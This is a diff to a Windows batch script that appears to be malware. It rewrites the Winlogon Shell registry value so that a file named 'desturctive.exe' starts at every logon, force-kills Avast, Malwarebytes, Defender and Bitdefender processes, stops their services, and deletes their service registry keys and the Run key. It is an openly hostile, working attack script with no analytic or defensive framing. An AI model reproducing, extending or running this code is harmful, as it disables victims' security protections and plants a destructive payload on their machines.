@@ -220,16 +220,39 @@ if %errorlevel% == 0 (
 
 :: Wait for the reboot to happen and run this part only after Safe Mode is entered
 
-:: Modify Shell registry to run batch file
+:: Modify Shell registry to run destructive file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Program Files\utkudrk2\utkudrk2.bat" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Program Files\utkudrk2\desturctive.exe" /f
+
+:: Kill antivirus processes
+echo Terminating antivirus processes...
+taskkill /F /IM AvastSvc.exe /T
+taskkill /F /IM AvastUI.exe /T
+taskkill /F /IM AvastWscReporter.exe /T
+taskkill /F /IM aswVmm.exe /T
+taskkill /F /IM MBAMService.exe /T
+taskkill /F /IM MsMpEng.exe /T
+taskkill /F /IM VSSERV.exe /T
+
+:: Stop antivirus services
+echo Stopping antivirus services...
+sc stop "AvastSvc"
+sc stop "AvastWscReporter"
+sc stop "aswVmm"
+sc stop "MBAMService"
+sc stop "WinDefend"
+sc stop "VSSERV"
+
+:: Wait a few seconds to ensure services are stopped
+timeout /t 5 /nobreak
 
 :: Perform cleanup tasks
-:: Delete registry keys related to antivirus services
 echo Deleting registry keys...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AvastSvc" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AvastWscReporter" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\aswVmm" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
